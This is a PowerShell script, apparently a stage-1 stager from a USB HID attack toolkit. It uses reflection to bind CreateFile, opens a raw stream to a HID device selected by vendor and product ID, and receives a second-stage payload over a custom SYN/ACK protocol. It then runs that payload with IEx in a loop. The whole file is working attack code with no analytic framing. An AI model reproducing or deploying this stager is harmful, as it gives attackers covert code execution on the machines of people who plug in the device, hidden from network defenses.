function ReflectCreateFileMethod()
{
  $dom = [AppDomain]::CurrentDomain
  $da = New-Object Reflection.AssemblyName("MaMe82DynAssembly")
  $ab = $dom.DefineDynamicAssembly($da, [Reflection.Emit.AssemblyBuilderAccess]::Run)
  $mb = $ab.DefineDynamicModule("MaMe82DynModule", $False)
  $tb = $mb.DefineType("MaMe82", "Public, Class")
  $cfm = $tb.DefineMethod("CreateFile", [Reflection.MethodAttributes] "Public, Static", [IntPtr], [Type[]] @([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr] ))
  $cdi = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
  $cfa = [Reflection.FieldInfo[]] @([Runtime.InteropServices.DllImportAttribute].GetField("EntryPoint"), [Runtime.InteropServices.DllImportAttribute].GetField("PreserveSig"), [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError"), [Runtime.InteropServices.DllImportAttribute].GetField("CallingConvention"), [Runtime.InteropServices.DllImportAttribute].GetField("CharSet"))
  $cffva = [Object[]] @("CreateFile", $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
  $cfca = New-Object Reflection.Emit.CustomAttributeBuilder($cdi, @("kernel32.dll"), $cfa, $cffva)
  $cfm.SetCustomAttribute($cfca)
  $tb.CreateType()
}

function CreateFileStreamFromDevicePath($mmcl, [String] $path)
{
  $h = $mmcl::CreateFile($path, [Int32]0XC0000000, [IO.FileAccess]::ReadWrite, [IntPtr]::Zero, [IO.FileMode]::Open, [UInt32]0x40000000, [IntPtr]::Zero)
  $a = $h, [Boolean]0
  $c=[Microsoft.Win32.SafeHandles.SafeFileHandle].GetConstructors()[0]
  $h = $c.Invoke($a)
  $fa=[IO.FileAccess]::ReadWrite
  $a=$h, $fa, [Int32]64, [Boolean]1
  $c=[IO.FileStream].GetConstructors()[14]
  return $c.Invoke($a)
}

function GetDevicePath($USB_VID, $USB_PID)
{
  $HIDGuid="{4d1e55b2-f16f-11cf-88cb-001111000030}"
  foreach ($wmidev in gwmi Win32_USBControllerDevice |%{[wmi]($_.Dependent)} ) {
    if ($wmidev.DeviceID -match ("$USB_VID" + '&PID_' + "$USB_PID") -and $wmidev.DeviceID -match ('HID') -and -not $wmidev.Service) {
      $devpath = "\\?\" + $wmidev.PNPDeviceID.Replace('\','#') + "#" + $HIDGuid
    }
  }
  $devpath
}

function bs($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
function sa($s,$a) { (bs ($s -band 15) 4) -bor ($a -band 15)}

$mmcl = ReflectCreateFileMethod
$path = GetDevicePath $USB_VID $USB_PID

$devfile = CreateFileStreamFromDevicePath $mmcl $path
try
{
  while ($true) {
    $packetSize = 64
    $txSeq = 8
    $lastRxSeq = 0xFF
    $lastRxAck = $txSeq - 1
    $rxSeq = 0
    $rxAck = 0

    $flag = 1 #SYN
    $d = New-Object IO.MemoryStream

    while($devfile.SafeFileHandle -ne $null) {
      $b = New-Object Byte[]($packetSize+1)
      $b[1] = sa $txSeq $rxSeq
      $b[3] = $flag
      $devfile.Write($b, 0, $packetSize+1)
  
      $txSeq=($txSeq+1) -band 0x0F
      if ($flag -eq 6) {break} # We've sent the FIN/ACK
  
      $r = $devfile.Read($b, 0, $packetSize+1)
      $rxSeq = (bs $b[1] -4) -band 0xF
      $rxAck = $b[1] -band 0x0F
      $ch = $b[2]
      $rxFlags = $b[3]
      $rxLength = $b[4]

      if (($lastRxSeq -eq 0xFF) -or ($rxSeq -eq (($lastRxSeq+1) -band 0x0F))) {
        $lastRxSeq = $rxSeq
      } else {
      }
      if (($rxAck -eq $lastRxAck) -or ($rxAck -eq (($lastRxAck+1) -band 0x0F))) {
        $lastRxAck = $rxAck
      } else {
      }

      if ($ch -eq 0) { # channel 0
        if ($rxFlags -eq 0) { # no flags, empty ACK of SEQ
        } elseif ($rxFlags -band 4) {  # FIN or FIN|ACK
          $flag = 6               # FIN/ACK
        } elseif ($rxFlags -band 2) {  # SYN/ACK or ACK
          if ($rxLength -gt 0) {
            $d.Write($b,5,$rxLength)
          }
          $flag = 2               # ACK
        } else {
          $d = New-Object IO.MemoryStream
          $flag = 1 # SYN
        }
      }
    }
    if ($d -ne $null) {
      $stage2 = ([Text.Encoding]::ASCII).GetString($d.ToArray())
      Start-Sleep -Seconds 5
      IEx $stage2
    }
  }
}
catch
{
  echo $_.Exception|format-list -force
}
finally
{
  $devfile.Close()
  $devfile.Dispose()
}
